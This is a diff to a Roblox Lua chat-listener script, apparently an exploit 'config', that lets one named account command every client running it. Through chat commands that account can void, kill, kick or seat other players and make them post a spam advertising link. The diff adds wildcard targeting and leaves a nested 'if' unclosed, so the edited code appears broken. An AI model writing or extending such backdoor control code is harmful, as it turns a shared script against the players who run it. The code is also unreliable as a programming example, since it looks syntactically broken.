@@ -33,30 +33,58 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
    print(cmd)
    print(target)
    
-   if cmd == ";void" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+   if cmd == ";void" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
       h = target.Character.HumanoidRootPart
       h.CFrame = h.CFrame - Vector3.new(0,1000,0)
-      
-   elseif cmd == ";cmds" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
-   local textChatService = game:GetService("TextChatService")
-   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad.⭐")
 
- elseif cmd == ";ad" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+ if cmd == ";void" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+      h = game.Players.LocalPlayer.Character.HumanoidRootPart
+      h.CFrame = h.CFrame - Vector3.new(0,1000,0)
+      
+   elseif cmd == ";cmds" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
+
+ elseif cmd == ";ad" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target  then
    local textChatService = game:GetService("TextChatService")
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
+
+  elseif cmd == ";ad" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "."  then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
+
+   elseif cmd == "config" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
+
+ elseif cmd == "config" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
    
-   elseif cmd == ";ac" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+   elseif cmd == ";ac" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
       h = target.Character.HumanoidRootPart
       h.CFrame = h.CFrame - Vector3.new(0,4000,0)
+
+ elseif cmd == ";ac" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+      h = game.Players.LocalPlayer.Character.HumanoidRootPart
+      h.CFrame = h.CFrame - Vector3.new(0,4000,0)
    
-   elseif cmd == ";reset" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+   elseif cmd == ";reset" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
    target.Character.Humanoid.Health = 0
 
-elseif cmd == ";kick" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+ elseif cmd == ";reset" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+   game.Players.LocalPlayer.Character.Humanoid.Health = 0
+
+elseif cmd == ";kick" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
    target:Kick("skill issue tbh")
 
-elseif cmd == ";sit" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
+elseif cmd == ";sit" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
    target.Character.Humanoid.Sit = true
+
+elseif cmd == ";sit" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+   game.Players.LocalPlayer.Character.Humanoid.Sit = true
+
+
    end
 
 end)
